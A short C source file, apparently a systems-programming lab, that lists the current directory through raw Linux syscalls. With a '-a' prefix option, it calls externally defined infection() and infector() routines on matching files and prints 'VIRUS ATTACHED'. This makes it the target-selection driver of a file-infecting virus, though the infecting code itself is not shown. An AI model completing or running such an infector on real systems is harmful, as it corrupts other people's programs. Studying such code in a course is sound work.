#include "util.h"
#include "dirent.h"
#include <fcntl.h>

#define BUF_SIZE 8192
#define ERR_EXIT_CODE 0x55

extern int system_call();
extern void infection();
extern void infector(char*);

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

int main(int argc , char* argv[], char* envp[]) {
    int fd;
    char buf[BUF_SIZE];
    int nread;

    fd = system_call(5, ".", 0 | O_DIRECTORY, 0); // O_RDONLY | O_DIRECTORY 
    if (fd < 0) {
        system_call(1, ERR_EXIT_CODE);
    }
    
    int attach_virus = 0;
    char *prefix;
    for(int i = 1 ; i < argc ; i++) {
        if (argv[i][0] == '-' && argv[i][1] == 'a') {
            attach_virus = 1;
            prefix = &argv[i][2];
        }
    }

    while (1) {
        nread = system_call(141, fd, buf, BUF_SIZE);
        if (nread < 0) {
            system_call(1, ERR_EXIT_CODE);
        }

        if (nread == 0) {
            break;
        }

        for (char *ptr = buf; ptr < buf + nread;) {
            struct linux_dirent *d = (struct linux_dirent *)ptr;
            if (attach_virus && strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
                infection();
                infector(d->d_name);
                system_call(4, 1, "VIRUS ATTACHED ", 15);
            }
            system_call(4, 1, d->d_name, strlen(d->d_name));
            system_call(4, 1, "\n", 1);
            ptr += d->d_reclen;
        }
    }

    system_call(6, fd);
    return 0;
}